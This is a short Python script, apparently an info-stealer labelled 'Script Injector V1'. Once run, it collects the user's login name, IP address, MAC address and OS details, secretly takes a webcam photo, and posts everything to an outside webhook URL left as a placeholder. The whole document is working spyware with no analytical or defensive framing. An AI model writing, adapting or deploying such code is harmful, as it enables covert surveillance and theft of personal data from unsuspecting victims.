import os
import socket
import platform
import requests
import uuid
import cv2
import getpass

WEBHOOK_URL = 'WEBHOOK URL GOES TO HERE'

username = getpass.getuser()

hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])

os_info = platform.platform()

def capture_image():
    cam = cv2.VideoCapture(0)
    result, image = cam.read()
    if result:
        image_path = "webcam.jpg"
        cv2.imwrite(image_path, image)
        cam.release()
        return image_path
    else:
        cam.release()
        return None

image_path = capture_image()

data = {
    "content": f"Script Injector V1:\n\n🔗 Username: {username}\n\n🛰️ IP Address: {ip_address}\n\n🖥️ MAC Address: {mac_address}\n\n🪟 OS Info: {os_info}"
}

files = {}
if image_path:
    files["file"] = (image_path, open(image_path, "rb"))

response = requests.post(WEBHOOK_URL, data=data, files=files)
   
